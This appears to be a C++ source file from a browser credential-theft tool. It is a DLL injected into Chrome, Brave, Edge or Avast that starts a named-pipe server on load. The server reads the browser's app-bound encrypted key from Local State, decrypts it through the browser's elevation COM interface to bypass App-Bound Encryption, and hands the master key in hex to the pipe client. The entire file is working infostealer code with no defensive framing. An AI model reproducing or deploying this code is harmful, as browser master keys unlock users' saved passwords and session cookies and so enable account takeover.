// Key extraction DLL: in-browser responder side.
// Runs inside the browser process: serves key extraction requests over a named pipe.

#include "key_core.hpp"
#include "../payload/browser_config.hpp"
#include "../com/elevator.hpp"
#include <fstream>
#include <sstream>
#include <cstdio>
#include <filesystem>

namespace KeyDll {

    HMODULE g_selfModule = nullptr;

    namespace {

        const char* TypeToConfigKey(uint8_t type) {
            switch (type) {
                case TYPE_CHROME:      return "chrome";
                case TYPE_CHROME_BETA: return "chrome-beta";
                case TYPE_BRAVE:       return "brave";
                case TYPE_EDGE:        return "edge";
                case TYPE_AVAST:       return "avast";
                default:               return nullptr;
            }
        }

        // Reads a named base64 key from Local State, strips the 4-byte version prefix.
        std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState,
                                                    const std::string& keyName,
                                                    std::string* errorMsg = nullptr) {
            std::ifstream f(localState, std::ios::binary);
            if (!f) {
                if (errorMsg) *errorMsg = "Cannot open Local State";
                return {};
            }

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

            std::string tag = "\"" + keyName + "\":\"";
            size_t pos = content.find(tag);
            if (pos == std::string::npos) {
                if (errorMsg) *errorMsg = "Key not found: " + keyName;
                return {};
            }

            pos += tag.length();
            size_t end = content.find('"', pos);
            if (end == std::string::npos) {
                if (errorMsg) *errorMsg = "Malformed JSON";
                return {};
            }

            std::string b64 = content.substr(pos, end - pos);

            DWORD size = 0;
            CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
            if (size < 5) {
                if (errorMsg) *errorMsg = "Invalid key data (too small)";
                return {};
            }

            std::vector<uint8_t> data(size);
            CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);

            return std::vector<uint8_t>(data.begin() + 4, data.end());
        }

        std::string KeyToHex(const std::vector<uint8_t>& key) {
            std::string hex;
            hex.reserve(key.size() * 2);
            for (auto b : key) {
                char buf[3];
                sprintf_s(buf, "%02X", b);
                hex += buf;
            }
            return hex;
        }

        bool ReadExact(HANDLE hPipe, void* buf, DWORD len) {
            auto p = static_cast<uint8_t*>(buf);
            DWORD done = 0;
            while (done < len) {
                DWORD read = 0;
                if (!ReadFile(hPipe, p + done, len - done, &read, nullptr) || read == 0)
                    return false;
                done += read;
            }
            return true;
        }

        bool WriteExact(HANDLE hPipe, const void* buf, DWORD len) {
            auto p = static_cast<const uint8_t*>(buf);
            DWORD done = 0;
            while (done < len) {
                DWORD written = 0;
                if (!WriteFile(hPipe, p + done, len - done, &written, nullptr) || written == 0)
                    return false;
                done += written;
            }
            return true;
        }

    }

    std::wstring PipeNameFor(uint32_t pid) {
        wchar_t name[64];
        swprintf_s(name, L"\\\\.\\pipe\\ABEKEY.%lu", static_cast<unsigned long>(pid));
        return name;
    }

    std::string ExtractHexKey(uint8_t type, uint8_t kind) {
        const char* cfgKey = TypeToConfigKey(type);
        if (!cfgKey) throw std::runtime_error("Unknown browser type");

        const auto& configs = Payload::GetConfigs();
        auto it = configs.find(cfgKey);
        if (it == configs.end()) throw std::runtime_error("Unknown browser type");
        const auto& browser = it->second;

        const char* keyName = (kind == KIND_ASTER) ? "aster_app_bound_encrypted_key"
                                                   : "app_bound_encrypted_key";

        std::string error;
        auto encKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", keyName, &error);
        if (encKey.empty()) throw std::runtime_error(error.empty() ? "Key not found" : error);

        Com::Elevator elevator;
        std::vector<uint8_t> masterKey;

        if (kind == KIND_ASTER) {
            masterKey = elevator.DecryptKeyEdgeIID(encKey, browser.clsid, browser.iid);
        } else {
            masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2,
                                            browser.name == "Edge", browser.name == "Avast");
        }

        if (masterKey.empty()) throw std::runtime_error("Empty key returned");

        return KeyToHex(masterKey);
    }

    DWORD WINAPI ResponderProc(LPVOID) {
        const std::wstring pipeName = PipeNameFor(GetCurrentProcessId());

        for (;;) {
            HANDLE hPipe = CreateNamedPipeW(pipeName.c_str(),
                                            PIPE_ACCESS_DUPLEX,
                                            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                                            1, 4096, 4096, 0, nullptr);
            if (hPipe == INVALID_HANDLE_VALUE) {
                Sleep(200);
                continue;
            }

            BOOL connected = ConnectNamedPipe(hPipe, nullptr)
                             || GetLastError() == ERROR_PIPE_CONNECTED;

            if (connected) {
                Request req{};
                if (ReadExact(hPipe, &req, sizeof(req)) && req.magic == PIPE_MAGIC) {
                    std::string payload;
                    int32_t status = 0;
                    try {
                        payload = ExtractHexKey(req.type, req.kind);
                    } catch (const std::exception& ex) {
                        status = 5;
                        payload = ex.what();
                    } catch (...) {
                        status = 5;
                        payload = "Unknown error";
                    }

                    if (payload.size() > 0xFFFF) {
                        status = 5;
                        payload = "Response too large";
                    }

                    ResponseHeader hdr{PIPE_MAGIC, status, static_cast<uint16_t>(payload.size())};
                    if (WriteExact(hPipe, &hdr, sizeof(hdr)) && !payload.empty()) {
                        WriteExact(hPipe, payload.data(), static_cast<DWORD>(payload.size()));
                    }
                    FlushFileBuffers(hPipe);
                }
                DisconnectNamedPipe(hPipe);
            }

            CloseHandle(hPipe);
        }
        return 0;
    }

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        KeyDll::g_selfModule = hModule;
        DisableThreadLibraryCalls(hModule);
        HANDLE hThread = CreateThread(nullptr, 0, KeyDll::ResponderProc, nullptr, 0, nullptr);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
